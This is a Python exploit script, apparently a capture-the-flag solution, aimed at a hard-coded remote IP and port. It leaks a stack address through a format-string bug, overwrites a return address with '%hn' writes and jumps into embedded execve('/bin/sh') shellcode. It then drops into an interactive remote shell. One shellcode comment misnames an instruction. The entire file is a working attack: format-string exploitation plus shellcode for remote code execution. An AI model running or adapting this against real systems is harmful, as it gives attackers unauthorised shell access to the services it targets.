#!/usr/bin/env python
import sc_pwn
from struct import *
import sys

rhp     = ("52.6.64.173",4545)
#rhp     = ("192.168.75.129",8080)

addr_buf    = 0x0804a080

out_len = lambda x: "%"+str(x if x>0 else 0x10000+x)+"x" if x!=0 else ""

#==========
def attack(nc):    
    nc.sendln("0x%4$08x")
    addr        = nc.read_until('\n').split()
    addr_ret_mr = int(addr[0],16) - 0x1c
    nc.read_all()

    sys.stdout.write("[+]addr_ret_mt    = 0x%08x\n"%addr_ret_mr)

    #exec("/bin/sh",NULL,NULL)
    shellcode  = "\x31\xc9"             # xor    ecx,ecx
    shellcode += "\x31\xd2"             # xor    edx,edx
    shellcode += "\x52"                 # push   edx
    shellcode += "\x68\x2f\x2f\x73\x68" # push   0x68732f2f
    shellcode += "\x68\x2f\x62\x69\x6e" # push   0x6e69622f
    shellcode += "\x89\xe3"             # mov    ebp,esp
    shellcode += "\x6a\x0b"             # push   0xb
    shellcode += "\x58"                 # pop    eax
    shellcode += "\xcd\x80"             # int    0x80

    payload  = pack('<I',0xdeadbeef)
    payload += shellcode

    exploit_st1  = out_len((addr_ret_mr&0xffff))
    exploit_st1 += "%4$hn"
    exploit_st2  = out_len(((addr_buf+4)&0xffff)-len(payload))
    exploit_st2 += "%12$hn"

    nc.sendln(exploit_st1)
    nc.sendln(payload+exploit_st2)
    nc.read_all()

#==========

if __name__=='__main__':
    nc = sc_pwn.Communicate(rhp)
    attack(nc)

    sh = sc_pwn.Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
